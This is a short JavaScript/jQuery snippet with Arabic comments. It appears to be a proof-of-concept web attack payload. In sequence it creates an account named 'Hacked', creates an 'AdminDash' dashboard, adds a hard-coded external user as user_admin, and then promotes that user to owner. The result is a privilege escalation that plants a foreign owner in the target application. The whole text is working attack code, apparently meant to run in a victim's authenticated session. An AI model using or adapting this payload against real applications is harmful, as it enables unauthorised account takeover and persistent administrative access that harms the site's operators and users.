// 1. إنشاء الحساب
$.post('/accounts', {account:{name:'Hacked'}}, function(acc) {
    let accId = acc.id; // الحصول على ID الحساب الجديد
    
    // 2. إنشاء الداشبورد
    $.ajax({
        url: `/eazy/accounts/${accId}/dashboards`,
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({name: 'AdminDash', definition: {pages:[], reports:[]}})
    });

    // 3. إضافة المستخدم كـ Admin
    $.post(`/eazy/accounts/${accId}/account_users`, {
        role: 'user_admin', 
        external_id: '712020:c7866df7-74f0-489d-90c3-b2ee3c541aa4'
    }, function(user) {
        // 4. ترقية المستخدم لـ Owner (بناءً على ID المستخدم الذي أُرجع)
        $.ajax({
            url: `/eazy/accounts/${accId}/account_users/${user.id}`,
            type: 'PUT',
            contentType: 'application/json',
            data: JSON.stringify({role: 'owner', user_id: user.user_id, id: user.id})
        });
    });
});
